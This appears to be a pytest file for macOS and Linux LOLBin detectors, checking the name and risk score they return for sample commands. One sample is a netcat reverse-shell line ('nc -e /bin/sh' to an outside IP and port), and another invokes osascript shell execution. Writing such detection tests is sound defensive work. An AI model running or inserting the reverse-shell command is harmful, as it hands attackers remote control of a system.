import pytest
from src.core.detect.lolbins.macos_lolbins import detect as mac_detect
from src.core.detect.lolbins.linux_lolbins import detect as linux_detect


def test_macos_lolbins_detect():
    r = mac_detect('osascript -e "do shell script"')
    assert r['name'] == 'osascript'
    assert r['risk'] >= 0.7


def test_linux_lolbins_detect():
    r = linux_detect('nc -e /bin/sh 1.2.3.4 4444')
    assert r['name'] == 'nc'
    assert r['risk'] >= 0.7
